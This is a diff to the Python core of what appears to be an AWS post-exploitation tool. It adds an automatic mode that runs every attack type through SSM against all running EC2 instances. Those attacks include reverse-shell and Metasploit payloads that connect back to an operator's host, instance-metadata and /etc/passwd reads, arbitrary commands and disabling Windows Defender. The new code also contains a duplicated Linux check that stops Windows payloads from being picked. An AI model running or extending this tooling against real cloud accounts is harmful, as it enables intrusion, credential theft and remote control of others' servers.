@@ -2,21 +2,21 @@ import logging
 import time
 from threading import Thread
 
-from clint.textui import prompt
-
 from src.constants.attack_types import AttackType
 from src.constants.commands import PRINT_EC2_METADATA_CMD, PRINT_EC2_METADATA_PSH, DISABLE_WINDOWS_DEFENDER, \
     ENABLE_WINDOWS_DEFENDER
 from src.constants.platforms import PlatformTypes
 from src.constants.scan_modes import EC2ScanMode
 from src.helpers.linux_commands import run_linux_command
-from src.helpers.metasploit_multiple_options import metasploit_installed_multiple_options
+from src.helpers.metasploit_multiple_options import metasploit_installed_multiple_options, \
+    get_all_metasploit_installed_options
 from src.helpers.metasploit_options import metasploit_installed_options
 from src.helpers.print_output import print_color
-from src.helpers.reverse_shell_options import reverseshell_multiple_options
+from src.helpers.reverse_shell_options import reverseshell_multiple_options, get_all_reverseshell_payloads
 from src.helpers.shell_options import reverseshell_options
 from src.helpers.windows_commands import run_windows_command
 from src.scanner.barq_scanner_core import BarqScannerCore
+from src.scanner.platform_mapping import PLATFORM_MAPPING
 from src.scanner.records.command_invocations import CommandInvocation
 from src.scanner.records.elastic_cloud import EC2Instance
 from src.scanner.records.findings import Secret, Parameter
@@ -198,28 +198,36 @@ class BarqScanner(BarqScannerCore):
         Perform attacks against selected eligible EC2 instances in the account
         :return: None
         """
-        targets = []
-        is_linux = False
-        is_windows = False
         if len(self.ec2_instances) == 0:
             print_color(
                 '[!] You have no stored EC2 instances. Run the command attacksurface to discover them')
-        for instance in self.ec2_instances:
-            if instance.iam_profile != '' and instance.state == 'running':
-                targets.append(instance)
-                if instance.platform is PlatformTypes.LINUX.value:
-                    is_linux = True
-                if instance.platform is PlatformTypes.WINDOWS.value:
-                    is_windows = True
+            return
+        targets = list(
+            filter(lambda instance: instance.iam_profile != '' and instance.state == 'running', self.ec2_instances)
+        )
+        is_linux = any(instance for instance in targets if instance.platform == PlatformTypes.LINUX.value)
+        is_windows = any(instance for instance in targets if instance.platform == PlatformTypes.WINDOWS.value)
         self.show_selected_ec2_instances(instances=targets)
+        if len(targets) < 1:
+            print_color('[!] No targets to proceed')
+            return
         print_color('[*] Target Options:')
         if scan_mode == EC2ScanMode.SINGLE.value:
-            instance = None
-            while instance is None:
-                target_id = prompt.query('Type/Paste your target EC2 ID:')
-                instance = next(target for target in targets if target.id == target_id)
-            print_color(f'[*] Target: {instance.id}')
-            self.attack_single_ec2_instance(instance=instance, attack_mode=attack_mode)
+            if not self._auto:
+                instance = None
+                while instance is None:
+                    target_id = self.get_setup_value(
+                        input_text_title='Type/Paste your target EC2 ID:',
+                        default_value=targets[0].id,
+                    )
+                    instance = next(target for target in targets if target.id == target_id)
+                print_color(f'[*] Target: {instance.id}')
+                self.attack_single_ec2_instance(instance=instance, attack_mode=attack_mode)
+            else:
+                print_color('[*] Iterate through all instances under auto scan')
+                for instance in targets:
+                    print_color(f'[*] Target: {instance.id}')
+                    self.attack_single_ec2_instance(instance=instance, attack_mode=attack_mode)
         else:
             self.attack_multiple_targets(targets, attack_mode, is_linux, is_windows)
         print_color("[+] Done launching attacks. Check command results with 'commandresults' option.")
@@ -235,109 +243,178 @@ class BarqScanner(BarqScannerCore):
         if instance.state != 'running':
             print_color('[!] The chosen target is not running! Exiting...')
             return False
-
-        action = 'AWS-RunShellScript' if instance.platform == PlatformTypes.LINUX.value else 'AWS-RunPowerShellScript'
+        command = ''
+        handler = PLATFORM_MAPPING[PlatformTypes[instance.platform]]
         if attack_mode in [AttackType.REVERSE_SHELL.value, AttackType.MSF.value]:
             print_color(
                 f"You chose {attack_mode} option. First provide your remote IP and port to explore shell options.",
                 'magenta')
-            remote_ip_host = prompt.query('Your remote IP or hostname to connect back to:')
-            remote_port = prompt.query("Your remote port number:", default="4444")
+
+            remote_ip_host = self.get_setup_value(
+                input_text_title='Your remote IP or hostname to connect back to:',
+                default_value=self.attack_setup.remote_ip_host,
+            )
+            remote_port = self.get_setup_value(
+                input_text_title='Your remote port number:',
+                default_value=self.attack_setup.remote_port,
+            )
             if attack_mode == AttackType.REVERSE_SHELL.value:
-                attack_mode, action = reverseshell_options(remote_ip_host, remote_port, instance.platform)
+                command = reverseshell_options(remote_ip_host, remote_port, instance.platform)
             elif attack_mode == AttackType.MSF.value:
-                attack_mode, action = metasploit_installed_options(remote_ip_host, remote_port, instance.platform)
+                command = metasploit_installed_options(remote_ip_host, remote_port, instance.platform)
             disable_av = True
         elif attack_mode == AttackType.URL.value:
-            print_color('[*] Choose the URL to visit from inside the EC2 instance:')
-            target_url = prompt.query('URL: ', default="http://169.254.169.254/latest/")
-            if instance.platform == PlatformTypes.LINUX.value:
-                attack_mode = "python -c \"import requests; print requests.get('%s').text;\"" % target_url
-            else:
-                attack_mode = "echo (Invoke-WebRequest -UseBasicParsing -Uri ('%s')).Content;" % target_url
+            target_url = self.get_setup_value(
+                input_text_title='Choose the URL to visit from inside the EC2 instance:',
+                default_value=self.attack_setup.url_address,
+            )
+            command = handler.attack_url % target_url
         elif attack_mode == AttackType.METADATA.value:
-            if instance.platform == PlatformTypes.LINUX.value:
-                attack_mode = PRINT_EC2_METADATA_CMD
-            else:
-                attack_mode = PRINT_EC2_METADATA_PSH
+            command = handler.attack_metadata
         elif attack_mode == AttackType.PRINT_FILE.value:
-            filepath = prompt.query(
-                'Enter the full file path: ', default="/etc/passwd")
-            attack_mode = "cat %s" % filepath
+            filepath = self.get_setup_value(
+                input_text_title='Enter the full file path:',
+                default_value=self.attack_setup.linux_file_path,
+            )
+            command = "cat %s" % filepath
         elif attack_mode == AttackType.COMMAND.value:
-            attack_mode = prompt.query(
-                'Enter the full command to run: (bash for Linux - Powershell for Windows)',
-                default="cat /etc/passwd")
+            command = self.get_setup_value(
+                input_text_title='Enter the full command to run: (bash for Linux - Powershell for Windows)',
+                default_value=self.attack_setup.command,
+            )
             disable_av = True
 
-        print_color('Sending the command "%s" to the target instance %s....' % (attack_mode, instance), 'cyan')
+        print_color('Sending the command "%s" to the target instance %s....' % (command, instance), 'cyan')
         ssm_client = self.set_session_region(instance.region).client('ssm')
         if instance.platform == PlatformTypes.LINUX.value:
-            return run_linux_command(ssm_client, instance, action, attack_mode)
-        return run_windows_command(ssm_client, instance, action, attack_mode, disable_av)
+            return run_linux_command(ssm_client, instance, handler.action, command)
+        return run_windows_command(ssm_client, instance, handler.action, command, disable_av)
 
     def attack_multiple_targets(self, targets: list[EC2Instance], attack_mode: str, linux, windows):
         """
         Launch commands against multiple EC2 instances
         :param targets: List of target EC2 instances
         :param attack_mode: The attack/command type
-        :param linux: Whether or not Linux is included in the targets.
-        :param windows: Whether or not Windows is included in the targets.
+        :param linux: Whether Linux is included in the targets.
+        :param windows: Whether Windows is included in the targets.
         :return: None
         """
 
-        windows_action = 'AWS-RunPowerShellScript'
-        linux_action = 'AWS-RunShellScript'
         linux_attack = ''
         windows_attack = ''
         disable_av = False
         if attack_mode == AttackType.REVERSE_SHELL.value or attack_mode == AttackType.MSF.value:
             print_color('Make sure your shell listener tool can handle multiple simultaneous connections!', 'magenta')
             disable_av = True
-            if attack_mode == AttackType.REVERSE_SHELL.value:
-                linux_attack, windows_attack = reverseshell_multiple_options(linux, windows)
-            elif attack_mode == AttackType.MSF.value:
-                linux_attack, windows_attack = metasploit_installed_multiple_options(
-                    linux, windows)
+            if self._auto:
+                linux_attacks = []
+                windows_attacks = []
+                if attack_mode == AttackType.REVERSE_SHELL.value:
+                    linux_attacks, windows_attacks = get_all_reverseshell_payloads(
+                        linux=linux,
+                        windows=windows,
+                        host=self.attack_setup.remote_ip_host,
+                        port=self.attack_setup.remote_port,
+                        port_windows=self.attack_setup.remote_port_windows,
+                        auto=True,
+                    )
+                elif attack_mode == AttackType.MSF.value:
+                    linux_attacks, windows_attacks = get_all_metasploit_installed_options(
+                        linux=linux,
+                        windows=windows,
+                        host=self.attack_setup.remote_ip_host,
+                        port=self.attack_setup.remote_port,
+                        port_windows=self.attack_setup.remote_port_windows,
+                        auto=True,
+                    )
+                for instance in targets:
+                    if instance.platform == PlatformTypes.LINUX.value:
+                        attack_list = linux_attacks
+                    elif instance.platform == PlatformTypes.LINUX.value:
+                        attack_list = windows_attacks
+                    else:
+                        print_color(f'[!] Unknown platform: {instance.platform}',)
+                        attack_list = []
+                    for attack in attack_list:
+                        self._run_attack_command_for_ec2_instance(
+                            instance=instance,
+                            command=attack,
+                            disable_av=disable_av,
+                        )
+            else:
+                if attack_mode == AttackType.REVERSE_SHELL.value:
+                    linux_attack, windows_attack = reverseshell_multiple_options(
+                        linux=linux,
+                        windows=windows,
+                        host=self.attack_setup.remote_ip_host,
+                        port=self.attack_setup.remote_port,
+                        port_windows=self.attack_setup.remote_port_windows,
+                    )
+                elif attack_mode == AttackType.MSF.value:
+                    linux_attack, windows_attack = metasploit_installed_multiple_options(
+                        linux=linux,
+                        windows=windows,
+                        host=self.attack_setup.remote_ip_host,
+                        port=self.attack_setup.remote_port,
+                        port_windows=self.attack_setup.remote_port_windows,
+                    )
         elif attack_mode == AttackType.URL.value:
-            print_color('[*] Choose the URL to visit from inside the EC2 instances:')
-            URL = prompt.query('URL: ', default="http://169.254.169.254/latest/")
-            linux_attack = "python -c \"import requests; print requests.get('%s').text;\"" % URL
-            windows_attack = "echo (Invoke-WebRequest -UseBasicParsing -Uri ('%s')).Content;" % URL
+            _url_address = self.get_setup_value(
+                input_text_title='Choose the URL to visit from inside the EC2 instances:',
+                default_value=self.attack_setup.url_address,
+            )
+            linux_attack = "python -c \"import requests; print requests.get('%s').text;\"" % _url_address
+            windows_attack = "echo (Invoke-WebRequest -UseBasicParsing -Uri ('%s')).Content;" % _url_address
         elif attack_mode == AttackType.METADATA.value:
             linux_attack = PRINT_EC2_METADATA_CMD
             windows_attack = PRINT_EC2_METADATA_PSH
         elif attack_mode == AttackType.PRINT_FILE.value:
-            linux_file_path = prompt.query(
-                '(Ignore if linux is not targeted)Enter the full file path for Linux instances: ',
-                default="/etc/passwd")
-            windows_file_path = prompt.query(
-                '(Ignore if Windows is not targeted)Enter the full file path for Windows instances: ',
-                default="C:\\Windows\\System32\\drivers\\etc\\hosts")
-            linux_attack = "cat %s" % linux_file_path
-            windows_attack = "cat %s" % windows_file_path
+            _linux_file_path = self.get_setup_value(
+                input_text_title='(Ignore if linux is not targeted)Enter the full file path for Linux instances:',
+                default_value=self.attack_setup.linux_file_path,
+            )
+            _windows_file_path = self.get_setup_value(
+                input_text_title='(Ignore if linux is not targeted)Enter the full file path for Windows instances:',
+                default_value=self.attack_setup.windows_file_path,
+            )
+            linux_attack = "cat %s" % _linux_file_path
+            windows_attack = "cat %s" % _windows_file_path
         elif attack_mode == AttackType.COMMAND.value:
-            linux_attack = prompt.query(
-                '(Ignore if linux is not targeted)Enter the full bash command to run: ', default="whoami")
-            windows_attack = prompt.query(
-                '(Ignore if Windows is not targeted)Enter the full Powershell command to run: ', default="whoami")
+            linux_attack = self.get_setup_value(
+                input_text_title='(Ignore if linux is not targeted)Enter the full bash command to run:',
+                default_value=self.attack_setup.bash_command,
+            )
+            windows_attack = self.get_setup_value(
+                input_text_title='(Ignore if Windows is not targeted)Enter the full Powershell command to run:',
+                default_value=self.attack_setup.powershell_command,
+            )
             disable_av = True
         logger.error("before running threaded attacks")
         for target in targets:
-            if target.platform == 'linux' and linux and target.iam_profile != '' and linux_attack != '':
-                # run_threaded_linux_command(self.session,target,linux_action,linux_attack)
-                logger.error(f"running run_threaded_linux_command for for {target.id}")
-                linux_thread = Thread(target=self.run_threaded_linux_command, args=(
-                    self.session, target, linux_action, linux_attack))
-                linux_thread.start()
-                logger.error(f"after running run_threaded_linux_command for {target.id}")
-            if target.platform == 'windows' and windows and target.iam_profile != '' and windows_attack != '':
-                logger.error(f"running run_threaded_windows_command for {target.id}")
-                # run_threaded_windows_command(self.session,target,windows_action,windows_attack)
-                windows_thread = Thread(target=self.run_threaded_windows_command, args=(
-                    self.session, target, windows_action, windows_attack, disable_av))
-                windows_thread.start()
-                logger.error(f"after run_threaded_windows_command for {target.id}")
+            self._run_attack_command_for_ec2_instance(
+                instance=target,
+                command=linux_attack if target.platform == PlatformTypes.LINUX.value else windows_attack,
+                disable_av=disable_av,
+            )
+
+    def _run_attack_command_for_ec2_instance(
+            self, instance: EC2Instance, command: str, disable_av: bool = False,) -> None:
+        if command == '':
+            logger.error(f"Command not provided")
+            return
+        handler = PLATFORM_MAPPING[PlatformTypes[instance.platform]]
+        if instance.platform == PlatformTypes.LINUX.value:
+            logger.error(f"running run_threaded_linux_command for for {instance.id}")
+            linux_thread = Thread(target=self.run_threaded_linux_command, args=(
+                self.session, instance, handler.action, command))
+            linux_thread.start()
+            logger.error(f"after running run_threaded_linux_command for {instance.id}")
+        elif instance.platform == PlatformTypes.WINDOWS.value:
+            logger.error(f"running run_threaded_windows_command for {instance.id}")
+            windows_thread = Thread(target=self.run_threaded_windows_command, args=(
+                self.session, instance, handler.action, command, disable_av))
+            windows_thread.start()
+            logger.error(f"after run_threaded_windows_command for {instance.id}")
 
     def run_threaded_linux_command(self, instance: EC2Instance, action, payload) -> None:
         """
@@ -431,7 +508,7 @@ class BarqScanner(BarqScannerCore):
             logger.error("inside run_threaded_windows_command for %s, before line: %s" % (
                 instance.id, 'get_command_invocation 1'))
             try:
-                result = ssm_client.get_command_invocation(
+                ssm_client.get_command_invocation(
                     CommandId=command_id, InstanceId=instance.id)
             except:
                 pass
@@ -460,7 +537,7 @@ class BarqScanner(BarqScannerCore):
         command = CommandInvocation(
             id=command_id,
             instance_id=command_id,
-            platform='windows',
+            platform=PlatformTypes.WINDOWS.value,
             region=instance.region,
         )
         self.add_command_invocation(command)
@@ -537,19 +614,30 @@ class BarqScanner(BarqScannerCore):
         result = ssm_client.get_command_invocation(
             CommandId=command_id, InstanceId=instance_id)
         logger.error(
-            'inside wait_for_threaded_command_invocation for %s and command_id: %s, after get_command_invocation a, status: %s' % (
-                instance_id, command_id, result['Status']))
+            f'inside wait_for_threaded_command_invocation for {instance_id} '
+            f"and command_id: {command_id}, after get_command_invocation a, status: {result['Status']}")
         while result['Status'] in {'InProgress', 'Pending', 'Waiting'}:
             time.sleep(10)
             result = ssm_client.get_command_invocation(
                 CommandId=command_id, InstanceId=instance_id)
             if result['Status'] in {'Failed', 'TimedOut', 'Cancelling', 'Cancelled'}:
                 logger.error(
-                    'failure in wait_for_threaded_command_invocation for %s and command_id: %s, after get_command_invocation b, status: %s' % (
-                        instance_id, command_id, result['Status']))
+                    f'failure in wait_for_threaded_command_invocation for {instance_id} '
+                    f"and command_id: {command_id}, after get_command_invocation b, status: {result['Status']}")
                 return False, result
         if result['Status'] == 'Success':
             logger.error(
-                'success in wait_for_threaded_command_invocation for %s and command_id: %s, after get_command_invocation b, status: %s' % (
-                    instance_id, command_id, result['Status']))
+                f"success in wait_for_threaded_command_invocation for {instance_id} "
+                f"and command_id: {command_id}, after get_command_invocation b, status: {result['Status']}")
             return True, result
+
+    def proceed_auto_scan(self) -> None:
+        self._auto = True
+        print_color("[*] Discovering attack surface of target AWS account...")
+        self.find_attack_surface()
+        print_color("[*] Discovering credentials...")
+        self.find_all_creds()
+        print_color("[*] Start EC2 Attack to all instances...")
+        for attack_type in AttackType:
+            print_color(f"[*] Processing {attack_type.value} ...")
+            self.run_ec2_attacks(scan_mode=EC2ScanMode.ALL.value, attack_mode=attack_type.value)
